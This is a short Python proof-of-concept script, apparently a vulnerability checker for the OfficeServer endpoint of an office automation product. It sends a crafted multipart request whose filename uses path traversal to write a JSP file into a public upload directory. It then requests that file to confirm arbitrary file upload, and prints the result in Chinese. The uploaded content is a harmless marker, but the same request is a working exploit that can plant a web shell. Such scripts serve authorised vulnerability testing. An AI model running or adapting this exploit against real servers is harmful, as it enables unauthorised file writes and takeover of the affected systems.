#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import requests
import urllib3
import sys
import time
import json
import re
from datetime import datetime, timedelta

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/defaultroot/OfficeServer"
    burp0_cookies = {"OASESSIONID": "35252D618F30B29C08B34E653C324E76", "LocLan": "zh_CN"}
    burp0_headers = {"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryk7uGGNUWdMDRBbBV", "User-Agent": "Moziilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"}
    burp0_data = "------WebKitFormBoundaryk7uGGNUWdMDRBbBV\r\nContent-Disposition: form-data; name=\"value1\"\r\n\r\n{\"OPTION\":\"SAVEPDF\"}\r\n------WebKitFormBoundaryk7uGGNUWdMDRBbBV\r\nContent-Disposition: form-data; name=\"value2\"\r\n\r\n{\"PDFPZ\":\"1\"}\r\n------WebKitFormBoundaryk7uGGNUWdMDRBbBV\r\nContent-Disposition: form-data; name=\"value3\"\r\n\r\n{\"FILENAMETRUE\":\"../../../public/upload/vulntest.jsp.\"}\r\n------WebKitFormBoundaryk7uGGNUWdMDRBbBV\r\nContent-Disposition: form-data; name=\"file\"; filename=\"vulntest.jsp\"\r\nContent-Type: text/plain\r\n\r\nvulntest\r\n------WebKitFormBoundaryk7uGGNUWdMDRBbBV--\r\n \r\n"
    r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, verify=False)
    if r.status_code == 200:
        shellpath = site + "/defaultroot/public/upload/vulntest.jsp"
        r2 = requests.get(shellpath, verify=False)
        if r2.status_code == 200 and "vulntest" in r2.text:
            return shellpath
    return ""
    
if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，文件上传后的路径为：", info)
    else:
        print("[-]漏洞不存在") 
